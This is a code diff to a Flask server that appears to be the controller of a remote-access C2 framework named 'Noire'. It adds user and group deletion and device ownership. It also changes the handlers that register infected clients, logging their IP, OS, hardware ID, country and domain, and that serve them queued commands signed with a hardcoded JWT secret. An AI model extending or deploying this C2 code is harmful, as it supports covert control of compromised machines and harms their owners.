@@ -16,10 +16,6 @@ socketio = SocketIO(app)
 
 db = SQLAlchemy()
 
-global allPermissions
-allPermissions = ['change_user_password', 'change_admin_password', 'change_user_permissions',
-                  'change_admin_permissions']
-
 class User(db.Model):
     """A User in the database
     """
@@ -82,6 +78,7 @@ class Group(db.Model):
     change_admin_passwords = db.Column(db.Boolean, default=False)
     change_user_permissions = db.Column(db.Boolean, default=False)
     change_admin_permissions = db.Column(db.Boolean, default=False)
+    delete_users = db.Column(db.Boolean, default=False)
     
 class Device(db.Model):
     """A Device connected to the server
@@ -90,6 +87,8 @@ class Device(db.Model):
     
     id = db.Column(db.Integer, primary_key=True)
     jwt = db.Column(db.String)
+    owner = db.Column(db.String)
+    nickname = db.Column(db.String, default="")
     ip = db.Column(db.String)
     user = db.Column(db.String)
     os = db.Column(db.String)
@@ -174,6 +173,25 @@ def addAccount(username:str, passw:str, isAdmin:bool = False) -> str:
     db.session.commit()
     return 'Account created successfully'
 
+def deleteAccount(username:str) -> str:
+    """
+    Delete a user from the database.
+
+    Args:
+        username (str): The username of the account to delete.
+
+    Returns:
+        str: A message indicating whether the account was deleted successfully.
+    """
+    user = User.query.get(username)
+    if not user: return "Account not found"
+    #Transfer all clients to the admin account
+    for device in Device.query.filter_by(owner=user.username):
+        device.owner = 'admin'
+    db.session.delete(user)
+    db.session.commit()
+    return 'Account deleted successfully'
+
 def addGroup(name:str, administrator:bool = False, change_user_passwords:bool = False, change_admin_passwords:bool = False, change_user_permissions:bool = False, change_admin_permissions:bool = False) -> str:
     """
     Add a group to the database.
@@ -196,11 +214,9 @@ def addGroup(name:str, administrator:bool = False, change_user_passwords:bool = 
     """
     # Check if required fields are provided
     if not name: return "Group name is required"
-    print(name)
 
     # Check if the group already exists
     group = Group.query.filter_by(name=name).first()
-    print(group)
     if group: return "A group with this name already exists"
 
     # Create the new group
@@ -219,6 +235,21 @@ def addGroup(name:str, administrator:bool = False, change_user_passwords:bool = 
 
     return 'Group created successfully'
 
+def deleteGroup(name:str) -> str:
+    """
+    Delete a group from the database.
+
+    Args:
+        name (str): The name of the group to delete.
+
+    Returns:
+        str: A message indicating whether the group was deleted successfully.
+    """
+    group = Group.query.filter_by(name=name).first()
+    if not group: return "Group not found"
+    db.session.delete(group)
+    db.session.commit()
+    return 'Group deleted successfully'
 
 #Startup checks
 with app.app_context():
@@ -376,6 +407,55 @@ def changePassPage():
             flask.flash('An invalid username was given', 'error')
     return flask.render_template('changePassword.html', users = users)
 
+@app.route('/settings/delete_user', methods=['GET', 'POST'])
+@flask_login.fresh_login_required
+def deleteUserPage():
+    user = flask_login.current_user
+    if not user.has_permission('administrator'):
+        if not user.has_permission('delete_user'):
+            users = [user]
+        else:
+            users = User.query.filter_by(administrator=False).all()
+    else:
+        users = User.query.all()
+    users.remove(User.query.get('admin'))
+    users = [user.username for user in users]
+    if flask.request.method == 'POST':
+        try:
+            user = User.query.get(flask.request.form['users'])
+            if user.username != flask.request.form['userCheck']:
+                flask.flash('Validation failed - The usernames do not match', 'error')
+            else:
+                users.index(user.username)#Check if user is available for them to edit
+                deletedUser = deleteAccount(user.username)
+                flask.flash(deletedUser, 'info')
+        except:
+            flask.flash('An invalid username was given', 'error')
+    return flask.render_template('deleteUser.html', users = users)
+
+@app.route('/settings/admin/delete_group', methods=['GET', 'POST'])
+@flask_login.fresh_login_required
+def deleteGroupPage():
+    user = flask_login.current_user
+    if not user.has_permission('administrator'):
+        flask.flash('You do not have access to this page', 'error')
+        return flask.redirect(flask.url_for('settingsPage'))
+    groups = Group.query.all()
+    groups.remove(Group.query.filter_by(name='admins').first())
+    groups = [group.name for group in groups]
+    if flask.request.method == 'POST':
+        try:
+            group = Group.query.filter_by(name=flask.request.form['groups']).first()
+            if group.name != flask.request.form['groupCheck']:
+                flask.flash('Validation failed - The names do not match', 'error')
+            else:
+                groups.index(group.name)#Check if user is available for them to edit
+                deletedGroups = deleteGroup(group.name)
+                flask.flash(deletedGroups, 'info')
+        except:
+            flask.flash('An invalid group name was given', 'error')
+    return flask.render_template('deleteGroup.html', groups = groups)
+        
 @app.route('/settings/admin/change_permissions')
 @flask_login.fresh_login_required
 def selectChangePermsPage():
@@ -478,7 +558,6 @@ def createGroupPage():
         return flask.redirect(flask.url_for('settingsPage'))
     if flask.request.method == 'POST':
         groupName = flask.request.form.get('groupName')
-        print(groupName)
         newGroup = addGroup(groupName)
         flask.flash(newGroup, 'info')
     return flask.render_template('createGroup.html')
@@ -500,6 +579,7 @@ def validateC2Client(request:flask.request) -> bool:
         cToken['time']
         cToken['country']
         cToken['domain']
+        cToken['uID']
         #add check for payload, validate encryption etc
         #Add check if NClient-Token (jwt) IP is same as request IP
         return True
@@ -527,10 +607,14 @@ def contactC2Page():
     jwT = flask.request.headers['NClient-Token']
     if not Device.query.filter_by(jwt=jwT).first():
         token = jwt.decode(jwT, 'Noire', algorithms=["HS256"])
+        try:
+            owner = User.query.get(token['uID'])
+        except:
+            owner = User.query.get('admin')
         uP, tP, rP = generateRandPath(), generateRandPath(), generateRandPath()
         newClient = Device(jwt=jwT, ip=token['ip'], os=token['os'], user=token['user'],
                            hwid=token['hwid'], uniquePath=uP, taskPath=tP, responsePath=rP,
-                           initialConnection=token['time'], country=token['country'], domain=token['domain'])
+                           initialConnection=token['time'], country=token['country'], domain=token['domain'], owner=owner)
         db.session.add(newClient)
         db.session.commit()
     else:
@@ -564,7 +648,7 @@ def instructReponsePages(c2ID:str, pName:str):
     if pName == gjwT.taskPath:
         if flask.request.method != "GET": return not_found("Bad method on control path")
         tasks = Task.query.filter_by(owner=jwT, running=False, response='NOTRUN').all()
-        if not tasks: return not_found("No tasks")
+        if not tasks: return ""
         tR = []
         for task in tasks:
             tR.append(jwt.encode({'id': task.id, 'command': task.command, 'args': task.arguments}, 'Noire'))#allow this to be modified
